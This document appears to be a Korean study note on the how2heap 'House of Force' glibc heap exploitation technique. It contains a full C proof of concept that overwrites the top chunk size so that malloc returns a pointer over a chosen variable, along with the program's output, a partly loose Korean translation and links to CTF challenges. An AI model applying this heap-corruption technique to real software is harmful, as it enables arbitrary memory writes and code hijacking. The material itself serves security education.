# How2Heap Study 10 House Of Force

## Tech Overview

Exploiting the Top Chunk (Wilderness) header in order to get malloc to return a nearly-arbitrary pointer

## Source

```c
/*

   This PoC works also with ASLR enabled.
   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.
   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum 
   ( http://phrack.org/issues/66/10.html )

   Tested in Ubuntu 14.04, 64bit.

*/


#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

char bss_var[] = "This is a string that we want to overwrite.";

int main(int argc , char* argv[])
{
	fprintf(stderr, "\nWelcome to the House of Force\n\n");
	fprintf(stderr, "The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n");
	fprintf(stderr, "The top chunk is a special chunk. Is the last in memory "
		"and is the chunk that will be resized when malloc asks for more space from the os.\n");

	fprintf(stderr, "\nIn the end, we will use this to overwrite a variable at %p.\n", bss_var);
	fprintf(stderr, "Its current value is: %s\n", bss_var);



	fprintf(stderr, "\nLet's allocate the first chunk, taking space from the wilderness.\n");
	intptr_t *p1 = malloc(256);
	fprintf(stderr, "The chunk of 256 bytes has been allocated at %p.\n", p1);

	fprintf(stderr, "\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n");
	int real_size = malloc_usable_size(p1);
	fprintf(stderr, "Real size (aligned and all that jazz) of our allocated chunk is %d.\n", real_size);

	fprintf(stderr, "\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n");

	//----- VULNERABILITY ----
	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size);
	fprintf(stderr, "\nThe top chunk starts at %p\n", ptr_top);

	fprintf(stderr, "\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n");
	fprintf(stderr, "Old size of top chunk %#llx\n", *((unsigned long long int *)ptr_top));
	ptr_top[0] = -1;
	fprintf(stderr, "New size of top chunk %#llx\n", *((unsigned long long int *)ptr_top));
	//------------------------

	fprintf(stderr, "\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n"
	   "Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n"
	   "overflow) and will then be able to allocate a chunk right over the desired region.\n");

	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*2 - (unsigned long)ptr_top;
	fprintf(stderr, "\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
	   "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
	void *new_ptr = malloc(evil_size);
	fprintf(stderr, "As expected, the new pointer is at the same place as the old top chunk: %p\n", new_ptr);

	void* ctr_chunk = malloc(100);
	fprintf(stderr, "\nNow, the next chunk we overwrite will point at our target buffer.\n");
	fprintf(stderr, "malloc(100) => %p!\n", ctr_chunk);
	fprintf(stderr, "Now, we can finally overwrite that value:\n");

	fprintf(stderr, "... old string: %s\n", bss_var);
	fprintf(stderr, "... doing strcpy overwrite with \"YEAH!!!\"...\n");
	strcpy(ctr_chunk, "YEAH!!!");
	fprintf(stderr, "... new string: %s\n", bss_var);


	// some further discussion:
	//fprintf(stderr, "This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n");
	//fprintf(stderr, "This because the main_arena->top pointer is setted to current av->top + malloc_size "
	//	"and we \nwant to set this result to the address of malloc_got_address-8\n\n");
	//fprintf(stderr, "In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n");
	//fprintf(stderr, "The av->top after this big malloc will be setted in this way to malloc_got_address-8\n\n");
	//fprintf(stderr, "After that a new call to malloc will return av->top+8 ( +8 bytes for the header ),"
	//	"\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n");

	//fprintf(stderr, "The large chunk with evil_size has been allocated here 0x%08x\n",p2);
	//fprintf(stderr, "The main_arena value av->top has been setted to malloc_got_address-8=0x%08x\n",malloc_got_address);

	//fprintf(stderr, "This last malloc will be served from the remainder code and will return the av->top+8 injected before\n");
}
```

## Output

```
Welcome to the House of Force

The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.
The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.

In the end, we will use this to overwrite a variable at 0x602060.
Its current value is: This is a string that we want to overwrite.

Let's allocate the first chunk, taking space from the wilderness.
The chunk of 256 bytes has been allocated at 0x1199010.

Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.
Real size (aligned and all that jazz) of our allocated chunk is 264.

Now let's emulate a vulnerability that can overwrite the header of the Top Chunk

The top chunk starts at 0x1199118

Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.
Old size of top chunk 0x20ef1
New size of top chunk 0xffffffffffffffff

The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.
Next, we will allocate a chunk that will get us right up against the desired region (with an integer
overflow) and will then be able to allocate a chunk right over the desired region.

The value we want to write to at 0x602060, and the top chunk is at 0x1199118, so accounting for the header size,
we will malloc 0xffffffffff468f38 bytes.
As expected, the new pointer is at the same place as the old top chunk: 0x1199120

Now, the next chunk we overwrite will point at our target buffer.
malloc(100) => 0x602060!
Now, we can finally overwrite that value:
... old string: This is a string that we want to overwrite.
... doing strcpy overwrite with "YEAH!!!"...
... new string: YEAH!!!
```

## 개요 번역

Exploiting the Top Chunk (Wilderness) header in order to get malloc to return a nearly-arbitrary pointer
malloc이 임의에 가까운 포인터를 반환하게 하기 위해서 탑 청크의 헤더를 공격합니다.

(번역은 완벽하지 않으며, 추후 수정될 수 있습니다.)

## 출력 번역

```
Welcome to the House of Force
House of Force 에 오신 것을 환영합니다.

The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.
House of Force 는 top 청크를 덮어써 malloc이 임의의 값을 반환하도록 만드는 것입니다.

The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.
top 청크는 특별한 청크입니다. 메모리의 마지막에 있고, 더 많은 공간을 얻기 위해 os 에게 malloc이 요청을 할 때 리사이즈되는 청크입니다.

In the end, we will use this to overwrite a variable at 0x602060.
끝에서 이 공격을 사용하여 0x602060 로 값을 변경할 것입니다.

Its current value is: This is a string that we want to overwrite.
이것의 현재 값은 " This is a string that we want to overwrite." 입니다.

Let's allocate the first chunk, taking space from the wilderness.
첫 번째 청크를 할당하면, 이 공간은 비어있는 공간에서 가져옵니다.

The chunk of 256 bytes has been allocated at 0x1199010.
256 바이트의 청크가 0x1199010 에 할당되었습니다.

Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.
이제 힙은 2 개의 청크로 구성되어 있습니다. : 첫 번째는 우리가 할당한 청크, 두 번재는 탑 청크(비어있는) 입니다.

Real size (aligned and all that jazz) of our allocated chunk is 264.
할당한 청크의 진짜 크기는 264 입니다.

Now let's emulate a vulnerability that can overwrite the header of the Top Chunk
Top 청크의 헤더를 덮어쓸 수 있도록 취약점을 시연해보겠습니다.

The top chunk starts at 0x1199118
탑 청크는 0x1199118 에서 시작합니다.

Overwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.
top 청크의 크기를 큰 값으로 덮어써서 malloc 이 mmap 시스템 콜을 반드시 호출하지 않도록 합니다.

Old size of top chunk 0x20ef1
top 청크의 예전 크기는 0x20ef1 입니다.

New size of top chunk 0xffffffffffffffff
이제 top 청크의 크기는 0xffffffffffffffff 입니다.

The size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.
빈 공간의 크기는 매우 거대합니다. malloc이 mmap 을 호출하지 않고도 무엇이든지 할당할 수 있습니다.

Next, we will allocate a chunk that will get us right up against the desired region (with an integer overflow) and will then be able to allocate a chunk right over the desired region.
다음으로, 우리가 원했던 구역 에 도달할 수 있는 바로 위 가까이 있는 청크를 할당하여(인티저 오버플로우를 통해) 원했던 구역의 바로 위의 청크를 할당할 수 있게 합니다.

The value we want to write to at 0x602060, and the top chunk is at 0x1199118, so accounting for the header size, we will malloc 0xffffffffff468f38 bytes.
우리가 쓰기를 원하는 값은 0x602060 이고, top 청크는 0x1199118 에 있으며, header 크기를 계산해보면, 우리는 0xffffffffff468f38 바이트를 할당해야 합니다.

As expected, the new pointer is at the same place as the old top chunk: 0x1199120
예외로, 새로운 포인터는 예전의 top 청크와 같은 곳에 있습니다. : 0x1199120

Now, the next chunk we overwrite will point at our target buffer.
이제 덮어쓸 다음 청크는 공격 대상 버퍼를 가리키고 있습니다.

malloc(100) => 0x602060!
malloc(100) 는 0x602060 를 가리킵니다.

Now, we can finally overwrite that value:
이제 최종적으로 값을 덮어써봅시다.

... old string: This is a string that we want to overwrite.
... 예전 문자열: "This is a string that we want to overwrite."

... doing strcpy overwrite with "YEAH!!!"...
... strcpy 를 통해 "YEAH!!!" 로 덮어씁니다.

... new string: YEAH!!!
... 새로운 문자열: "YEAH!!!"
```

## Applicable CTF Challenges
(적용 가능한 CTF 문제들)

* Boston Key Party 2016-cookbook - [블로그]() / [바이너리](https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6)
* BCTF 2016-bcloud - [블로그]() / [바이너리](https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200)